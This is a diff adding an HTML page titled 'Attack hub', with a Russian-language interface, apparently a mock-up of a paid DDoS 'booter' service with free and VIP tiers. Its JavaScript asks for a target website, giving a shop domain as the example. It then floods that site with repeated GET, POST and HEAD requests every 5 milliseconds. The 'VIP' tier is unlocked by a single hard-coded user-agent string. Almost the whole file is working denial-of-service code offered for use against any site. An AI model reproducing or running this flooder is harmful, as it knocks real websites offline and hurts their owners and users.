@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+	<html>
+		<head>
+			<title>Attack hub</title>
+			</head>
+			<body>
+			<center>
+				<h3>
+				Attack hub
+				</h3>
+				<h4><p id="tariff"></p></h4>
+				<br>
+			<center>Method of attack: <br><select id="select_"><option disabled>FREE methods</option><option value="HTTP-GET">[L7] HTTP/S-GET</option><option value="HTTP-MIX">[L7] HTTP/S MIX</option><option disabled>VIP methods</option><option value="HTTP-CUSTOM">[L7]HTTP/S-CUSTOM</option></select></center><br>
+				<center><input type="submit" value="Начать атаку" onclick="lok()"></center>
+<script>
+const VIP = [
+    'Mozilla/5.0 (Linux; Android 10; STK-LX1 Build/HONORSTK-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36'
+ ];
+ if(navigator.userAgent == VIP) {
+let checking = document.getElementById("tariff");
+checking.textContent = 'Ваш тариф: VIP'
+}
+if(navigator.userAgent != VIP) {
+let checking = document.getElementById("tariff");
+checking.textContent = 'Ваш тариф: FREE'
+}
+
+	lok = function() {
+var target = prompt('Сайт для атаки (пример; magazin-andrey.ru)', );
+var select = document.getElementById("select_");
+var value = select.value;
+if(value == "HTTP-GET") {
+HTTPGET()
+function HTTPGET() {
+var xhr = new XMLHttpRequest();
+xhr.open("GET", target);
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("GET", target);
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("GET", target);
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("GET", target);
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("GET", target);
+xhr.send();
+}
+
+setInterval(HTTPGET, 5)
+}
+
+if(value == "HTTP-MIX") {
+HTTPMIX()
+function HTTPMIX() {
+var xhr = new XMLHttpRequest();
+xhr.open("POST", target);
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.setRequestHeader("Content-Length", "0");
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("GET", target);
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("HEAD", target);
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("POST", target);
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.setRequestHeader("Content-Length", "0");
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("GET", target);
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("HEAD", target);
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("POST", target);
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.setRequestHeader("Content-Length", "0");
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("GET", target);
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("HEAD", target);
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("POST", target);
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.setRequestHeader("Content-Length", "0");
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("GET", target);
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("HEAD", target);
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("POST", target);
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.setRequestHeader("Content-Length", "0");
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("GET", target);
+xhr.send();
+var xhr = new XMLHttpRequest();
+xhr.open("HEAD", target);
+xhr.send();
+}
+
+setInterval(HTTPMIX, 5)
+}
+
+if(value == "HTTP-CUSTOM") {
+if(navigator.userAgent != VIP) {
+alert("1000-7")
+}
+if(navigator.userAgent == VIP) {
+alert("VIP")
+}
+}
+}
+</script>
+				</body>
+				</html>
